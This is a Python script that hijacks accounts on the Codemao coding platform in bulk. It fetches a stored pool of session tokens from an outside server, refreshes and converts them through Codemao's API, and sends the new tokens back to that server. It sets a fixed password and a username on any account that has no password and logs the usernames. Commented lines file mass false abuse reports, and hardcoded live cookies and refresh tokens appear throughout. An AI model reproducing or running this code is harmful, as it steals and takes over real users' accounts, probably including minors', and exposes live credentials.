import random
import time
import requests
from json import loads
import threading


def find_user(start,end):
    user = loads(requests.get('https://newcodemao.pythonanywhere.com/get_users').text)
    user_dict = {}
    for use in user:
        if int(use["id"]) < start:
            continue
        if int(use["id"]) > end:
            break
        try:
            print('--------' * 20)
            print(use["id"])
            new_token = loads(requests.post('https://api.codemao.cn/tiger/v3/web/accounts/tokens/convert',headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            requests.get(f'https://newcodemao.pythonanywhere.com/update_user?id={use["id"]}&userid={new_token["access"]["token"]}&phone={new_token["refresh"]["token"]}')
            info = loads(requests.get('https://api.codemao.cn/web/users/details',headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            print(info["nickname"],info['has_password'],'username:'+info['username'],'--user_id'+info['id'])
            if info['has_password'] is False:
                rani = str(random.randint(0, 1000000))

                if info['username'] == '':
                    print(requests.patch('https://api.codemao.cn/tiger/v3/web/accounts/username',json={'username': 'accountt'+rani}, headers={'cookie': f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
                    with open('log.txt',mode='a+') as file:
                        file.write('accountt'+rani+'\n')
                else:
                    with open('log.txt', mode='a+') as file:
                        file.write(info['username']+'\n')
                print(requests.patch('https://api.codemao.cn/tiger/v3/web/accounts/password/setting',json={"password":"edu1143137099","confirm_password":"edu1143137099"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            # print(requests.post('https://api.codemao.cn/web/reports/posts',json={"post_id":"699297","reason_id":"2","description":"发布黄色信息，严重影响社区风气"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            #print(requests.post('https://api.codemao.cn/nemo/v2/report/work',json={"work_id":214173479,"report_reason":"违法违规","report_describe":"2222"},headers={'cookie':f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={use["phone"]}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
            user_dict[info['nickname']] = 'get'
            print(use["phone"])
        except KeyError as e:
            print(e)
            try:
                nt = loads(requests.put("https://api.codemao.cn/tiger/v3/web/accounts/tokens/refresh", json={"refresh_token": use["userid"]}).text)["access"]["token"]
                nt = loads(requests.post('https://api.codemao.cn/tiger/v3/web/accounts/tokens/convert', headers={
                    'cookie': f'__ca_uid_key__=bcbd7bb6-d916-4741-ba3f-61a568bc8557; _ga=GA1.2.188248654.1717420772; _ga_JEHRTN2DXN=GS1.2.1717420772.1.0.1717420772.0.0.0; refresh-token=MToxNTI0OTUyOTpXRUI6QUFBQmtFLWg0LU5ZNUtsQWFWdW4yQzROcHNrMW1Ubk06YjA2Mjk4YzctMzYwZS00ZjE3LWI0MzAtYzg0YjQ3ZDNmOTYy; aliyungf_tc=51590eff1c0070c20cd7deee882be8aff4eab62bd9889cdbd6d48c9b21966ee4; acw_tc=ac11000117193635775083072e560b2554adf671fe4fe2b69881bacbe08ec2; authorization={nt}; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2211600089%22%2C%22first_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%2218fd645fb53c6e-0778cd14b802cf-26001c51-2073600-18fd645fb54f6d%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMThmZDZmZjU1NWE3NzItMGMyZGNmNDIxNmU1NjE4LTI2MDAxYzUxLTIwNzM2MDAtMThmZDZmZjU1NWJlNGYiLCIkaWRlbnRpdHlfbG9naW5faWQiOiIxMTYwMDA4OSJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%2211600089%22%7D%7D'}).text)
                requests.get(f'https://newcodemao.pythonanywhere.com/update_user?id={use["id"]}&userid={nt["access"]["token"]}&phone={nt["refresh"]["token"]}')
                print('更新成功')
            except KeyError:
                print('错误')
                print(use["phone"])
                print(requests.get(f'https://newcodemao.pythonanywhere.com/delete_user?phone={use["id"]}').text)
        except requests.exceptions.ConnectionError as e:
            print(str(e))
    print('运行报告：账号库总账号数量'+str(len(user_dict)))

find_user(0,4900)



